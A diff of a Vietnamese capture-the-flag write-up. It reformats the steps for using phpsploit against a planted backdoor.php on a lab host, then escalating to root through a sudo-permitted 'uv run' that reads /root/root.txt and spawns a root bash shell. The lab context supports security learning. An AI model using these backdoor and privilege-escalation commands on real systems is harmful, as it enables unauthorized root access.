@@ -272,27 +272,28 @@ Chạy:
 ```bash
 ./phpsploit
 # hoặc python3 phpsploit
-
-phpsploit> set TARGET http://dev.astra.dsz/backdoor.php
-phpsploit> exploit
+```
+khi đã vào phpsploit>
+```bash
+ set TARGET http://dev.astra.dsz/backdoor.php
+ exploit
 ```
 
-Khi vào session:
+Khi vào session: phpsploit(dev.astra.dsz)>
 
 ```text
-phpsploit(dev.astra.dsz)> run id
-phpsploit(dev.astra.dsz)> run whoami
-# www-data
+run id
+run whoami
 ```
 
 ---
 
 ## 2.7. Privilege Escalation qua `uv`
 
-### Trong phpsploit
+### Trong p phpsploit(dev.astra.dsz)> 
 
 ```text
-phpsploit(dev.astra.dsz)> run sudo -l
+run sudo -l
 ```
 
 Kết quả:
@@ -305,15 +306,16 @@ User www-data may run the following commands on GameShell2:
 `uv` là Python package/environment manager. `uv run` có thể thực thi lệnh tùy ý.
 
 Lấy root flag:
+tại phpsploit(dev.astra.dsz)> 
 
 ```text
-phpsploit(dev.astra.dsz)> run sudo /usr/local/bin/uv run cat /root/root.txt
+run sudo /usr/local/bin/uv run cat /root/root.txt
 ```
 
 Hoặc spawn shell root:
 
 ```text
-phpsploit(dev.astra.dsz)> run sudo /usr/local/bin/uv run /bin/bash
+ run sudo /usr/local/bin/uv run /bin/bash
 ```
 
 **Root flag (theo writeup):**
